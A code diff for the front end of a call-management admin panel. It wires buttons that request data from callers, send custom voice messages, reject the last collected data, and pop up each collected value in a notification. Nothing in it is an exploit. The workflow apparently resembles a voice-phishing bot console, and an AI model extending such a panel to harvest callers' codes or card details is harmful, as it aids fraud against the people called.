@@ -97,7 +97,7 @@ document.getElementById('callForm').addEventListener('submit', async (e) => {
     }
 });
 
-// Action buttons
+// Action buttons for data requests
 document.querySelectorAll('.action-btn').forEach(btn => {
     btn.addEventListener('click', async () => {
         if (!currentSessionId) {
@@ -117,6 +117,7 @@ document.querySelectorAll('.action-btn').forEach(btn => {
             const data = await response.json();
             if (data.success) {
                 addLog(`Requested ${action.replace('_', ' ').toUpperCase()} from user`, 'success');
+                playNotificationSound();
             }
         } catch (error) {
             addLog(`Error requesting action: ${error.message}`, 'error');
@@ -124,32 +125,7 @@ document.querySelectorAll('.action-btn').forEach(btn => {
     });
 });
 
-// Reject button
-document.getElementById('rejectDataBtn').addEventListener('click', async () => {
-    if (!currentSessionId) {
-        addLog('No active call selected', 'warning');
-        return;
-    }
-    
-    try {
-        const response = await fetch(`/api/admin/reject-data/${currentSessionId}`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' }
-        });
-        
-        const data = await response.json();
-        if (data.success) {
-            addLog(`Rejected: ${data.message}`, 'warning');
-            loadContacts();
-        } else {
-            addLog(`Failed to reject: ${data.message}`, 'error');
-        }
-    } catch (error) {
-        addLog(`Error rejecting data: ${error.message}`, 'error');
-    }
-});
-
-// Custom voice
+// Custom voice button
 document.getElementById('sendCustomVoice').addEventListener('click', async () => {
     if (!currentSessionId) {
         addLog('No active call selected', 'warning');
@@ -173,12 +149,40 @@ document.getElementById('sendCustomVoice').addEventListener('click', async () =>
         if (data.success) {
             addLog(`Custom voice sent: "${message}"`, 'success');
             document.getElementById('customVoiceMessage').value = '';
+            playNotificationSound();
         }
     } catch (error) {
         addLog(`Error sending custom voice: ${error.message}`, 'error');
     }
 });
 
+// Reject last data button
+document.getElementById('rejectDataBtn').addEventListener('click', async () => {
+    if (!currentSessionId) {
+        addLog('No active call selected', 'warning');
+        return;
+    }
+    
+    try {
+        const response = await fetch(`/api/admin/reject-last-data/${currentSessionId}`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' }
+        });
+        
+        const data = await response.json();
+        if (data.success) {
+            addLog(`Rejected: ${data.message}`, 'warning');
+            loadContacts();
+            playNotificationSound();
+        } else {
+            addLog(`Failed to reject: ${data.message}`, 'error');
+        }
+    } catch (error) {
+        addLog(`Error rejecting data: ${error.message}`, 'error');
+    }
+});
+
+// Clear logs button
 document.getElementById('clearLogs').addEventListener('click', () => {
     const container = document.getElementById('logsContainer');
     container.innerHTML = '<div class="log-entry info">Logs cleared</div>';
@@ -224,6 +228,7 @@ socket.on('data_collected', (data) => {
     playNotificationSound();
     loadContacts();
     
+    // Popup notification
     const notification = document.createElement('div');
     notification.style.cssText = 'position:fixed;bottom:20px;right:20px;background:#10b981;color:white;padding:12px 20px;border-radius:8px;z-index:9999;font-weight:bold;box-shadow:0 4px 6px rgba(0,0,0,0.1);';
     notification.innerHTML = `<i class="fas fa-database"></i> ${data.type.toUpperCase()}: ${data.value}`;
@@ -272,6 +277,12 @@ async function loadActiveCalls() {
                     </div>
                 </div>
             `;
+            
+            // If call is not in consent stage, show buttons
+            if (call.current_action !== 'consent') {
+                document.getElementById('actionButtons').style.display = 'grid';
+                document.getElementById('customVoiceSection').style.display = 'block';
+            }
         } else {
             container.innerHTML = '<div class="no-active">No active call</div>';
         }
